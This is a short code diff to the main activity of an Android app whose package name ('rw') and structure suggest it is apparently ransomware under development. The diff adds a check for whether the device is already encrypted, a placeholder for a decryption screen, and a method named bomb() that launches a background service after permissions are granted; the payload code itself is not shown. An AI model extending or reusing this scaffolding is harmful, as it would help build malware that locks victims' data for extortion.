@@ -16,6 +16,9 @@ import android.support.v4.content.ContextCompat;
 import java.util.ArrayList;
 import java.util.List;
 
+import alepacheco.com.rw.persistence.LocalStorage;
+import alepacheco.com.rw.services.MyService;
+
 public class MainActivity extends Activity {
     String[] permissions = new String[]{
             Manifest.permission.INTERNET,
@@ -25,8 +28,15 @@ public class MainActivity extends Activity {
     Context ctx;
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(alepacheco.com.rw.R.layout.activity_main);
+        setContentView(R.layout.activity_main);
         ctx = this;
+        if(isEncrypted()){
+            /*
+            * show activity to decrypt
+            * */
+            return;
+        }
+
         if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             // Alert for permisions
             new AlertDialog.Builder(this)
@@ -36,19 +46,25 @@ public class MainActivity extends Activity {
                         public void onClick(DialogInterface dialog, int which) {
                             boolean permit = checkPermissions();
                             if (permit) {
-                                new RunService().execute(ctx);
+                                bomb();
                             }
                         }
                     })
                     .setIcon(android.R.drawable.ic_dialog_info)
                     .show();
         } else {
-            new RunService().execute(ctx);
+            bomb();
         }
 
 
+    }
 
+    public void bomb(){
+        new RunService().execute(ctx);
+    }
 
+    private Boolean isEncrypted(){
+        return LocalStorage.getInstance(ctx).getBooleanByTag(LocalStorage.TAG_ENCRYPTED);
     }
 
     private class RunService extends AsyncTask<Context, Void, Void> {
